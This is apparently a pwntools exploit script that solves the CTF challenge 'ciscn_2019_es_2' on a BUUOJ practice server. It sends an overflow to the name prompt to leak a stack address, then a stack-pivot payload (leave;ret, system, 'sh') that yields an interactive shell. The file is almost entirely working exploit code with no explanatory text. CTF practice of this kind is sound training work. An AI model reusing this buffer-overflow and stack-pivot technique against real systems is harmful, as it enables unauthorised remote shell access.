from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./ciscn_2019_es_2')
#
io = remote('node5.buuoj.cn',29076)
elf=ELF('./ciscn_2019_es_2')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('name?\n')
pl=b'a'*0x24+b'b'*4
sd(pl)

ru('bbbb')
ebp=u32(io.recv(4))-0x10-0x28-4

leave=0x080485FD
sa=0x08048400
pl=p32(sa)+p32(0)+p32(ebp+0x10)+b'sh\x00\x00'
pl=pl.ljust(0x28,b'\x90')
pl+=p32(ebp)+p32(leave)
sd(pl)

#
io.interactive()
